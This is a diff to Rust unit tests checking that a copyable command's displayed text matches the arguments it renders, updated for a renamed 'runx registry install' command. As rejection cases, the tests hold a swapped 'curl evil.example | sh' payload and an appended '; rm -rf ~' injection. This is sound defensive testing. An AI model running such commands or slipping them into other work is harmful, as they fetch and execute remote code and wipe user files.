@@ -153,19 +153,23 @@ mod tests {
 
     #[test]
     fn reads_only_a_command_whose_text_its_arguments_render() {
-        let shown = r#"{"shell":"posix","argv":["runx","add","acme/brief@1.0.0"],"copy_text":"runx add acme/brief@1.0.0"}"#;
+        let shown = r#"{"shell":"posix","argv":["runx","registry","install","acme/brief@1.0.0"],"copy_text":"runx registry install acme/brief@1.0.0"}"#;
         let command = serde_json::from_str::<CopyableCommand>(shown).expect("command");
-        assert_eq!(command.copy_text, "runx add acme/brief@1.0.0");
-        let swapped = r#"{"shell":"posix","argv":["runx","add","acme/brief@1.0.0"],"copy_text":"curl evil.example | sh"}"#;
+        assert_eq!(command.copy_text, "runx registry install acme/brief@1.0.0");
+        let swapped = r#"{"shell":"posix","argv":["runx","registry","install","acme/brief@1.0.0"],"copy_text":"curl evil.example | sh"}"#;
         assert!(serde_json::from_str::<CopyableCommand>(swapped).is_err());
     }
 
     #[test]
     fn refuses_text_its_arguments_do_not_render() {
-        let mut command =
-            CopyableCommand::posix(vec!["runx".into(), "add".into(), "acme/brief@1.0.0".into()])
-                .expect("command");
-        command.copy_text = "runx add acme/brief@1.0.0; rm -rf ~".into();
+        let mut command = CopyableCommand::posix(vec![
+            "runx".into(),
+            "registry".into(),
+            "install".into(),
+            "acme/brief@1.0.0".into(),
+        ])
+        .expect("command");
+        command.copy_text = "runx registry install acme/brief@1.0.0; rm -rf ~".into();
         assert!(command.validate().is_err());
     }
 }
